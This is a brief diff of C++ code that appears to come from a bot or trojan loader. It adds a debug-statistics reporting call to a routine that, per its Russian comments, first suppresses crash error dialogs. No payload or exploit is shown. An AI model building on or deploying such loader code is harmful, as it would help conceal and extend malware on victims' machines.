@@ -18,10 +18,11 @@
 #include "Task.h"
 #include "md5.h"
 #include "BotDef.h"
-
+#include "DbgRpt.h"
 #include "Modules.h"
 
 #include "BotDebug.h"
+
 
 
 //********************** Отладочные шаблоны **********************************
@@ -109,6 +110,9 @@ DWORD WINAPI LoaderRoutine( LPVOID lpData )
 
 	// Отключаем отображение ошибок при крахе процесса
 	DisableShowFatalErrorDialog();
+
+	// Инициализируем отсылку статистики
+	DebugReportInit();
 
 	// Вызываем событие
 	bool Cancel = false;
